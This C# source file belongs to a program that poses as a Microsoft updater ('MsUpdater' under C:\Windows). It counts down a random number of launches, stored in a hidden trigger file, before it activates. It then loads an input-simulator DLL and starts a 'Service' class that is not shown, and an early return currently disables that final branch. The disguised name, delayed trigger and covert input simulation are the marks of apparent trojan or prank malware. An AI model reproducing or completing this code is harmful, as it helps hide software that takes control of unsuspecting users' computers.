namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.CompilerServices;
    using System.Threading;

    internal static class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            Thread.Sleep(200);

#if !DEBUG
            const string Target = @"C:\Windows\MsUpdater\trigger";
            
            if (!File.Exists(Target))
            {
                File.WriteAllText(Target, new Random().Next(20, 40).ToString());
                return;
            }

            var reboots = int.Parse(File.ReadAllLines(Target).Single());

            if (reboots != 0)
            {
                File.WriteAllText(Target, (reboots - 1).ToString());
                return;
            }
#endif

            return;

            // TODO Directory security

            using (File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                using (File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read))
                {
                    RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
                    Process.GetCurrentProcess().WaitForExit();
                }
            }
        }
    }
}